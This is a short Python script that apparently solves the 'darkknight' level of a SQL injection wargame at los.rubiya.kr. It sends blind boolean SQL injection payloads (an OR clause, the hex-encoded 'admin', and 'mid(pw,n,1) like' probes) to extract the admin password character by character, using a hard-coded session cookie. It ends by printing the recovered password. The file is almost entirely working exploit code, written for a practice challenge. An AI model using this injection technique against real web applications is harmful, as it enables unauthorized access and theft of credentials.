
import requests
headers = {'Cookie':'PHPSESSID=jdkmar3vqh5itlr4eo2b593h5c'}
url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
wordlist = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9']
# r = requests.get(url, headers=headers).text
solved=False
currletter = 1
password = ""
while not solved:
    for thing in wordlist:
        statement = f"?no=1%20||%20id%20like%200x61646d696e%20%26%26%20mid(pw,{currletter},1)%20like%20\"{thing}\"%20"
        tempurl = url+statement
        print(statement)
        r = requests.get(tempurl, headers=headers).text
        # print(r)
        # print(thing)
        if r"<h2>Hello admin</h2><code>" in r:
            password+=thing
            currletter+=1
            print(thing)
    if len(password)==8:
        solved=True
print(password)

### SOLVED ###
# pw = '0b70ea1f'